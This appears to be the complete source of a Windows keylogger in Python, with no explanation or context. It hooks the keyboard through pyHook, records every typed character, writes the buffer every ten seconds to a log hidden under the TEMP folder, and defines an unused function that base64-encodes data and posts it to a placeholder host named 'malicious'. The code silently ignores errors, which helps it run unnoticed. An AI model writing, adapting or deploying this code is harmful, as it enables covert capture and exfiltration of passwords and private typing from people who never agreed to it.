import os
import pyHook
import pythoncom
import requests
import base64
import threading

WEBSITE_URL = "https://malicious/keys"

def send_to_website(data):
    try:
        encoded_data = base64.b64encode(data.encode()).decode()
        response = requests.post(WEBSITE_URL, data={"keystrokes": encoded_data})
    except Exception as e:
        pass

def save_to_file(data):
    try:
        temp_dir = os.environ.get('TEMP')
        directory = os.path.join(temp_dir, "win32")
        os.makedirs(directory, exist_ok=True)
        file_path = os.path.join(directory, "log.txt")
        with open(file_path, "a") as file:
            file.write(data)
    except Exception as e:
        pass

def on_keyboard_event(event):
    if event.Ascii != 0:
        key = chr(event.Ascii)
        buffer.append(key)

def save_buffer_periodically():
    while True:
        if buffer:
            save_to_file("".join(buffer))
            del buffer[:]
        threading.Timer(10, save_buffer_periodically).start()
        break

buffer = []

hook_manager = pyHook.HookManager()
hook_manager.KeyDown = on_keyboard_event
hook_manager.HookKeyboard()

save_buffer_periodically()

pythoncom.PumpMessages()

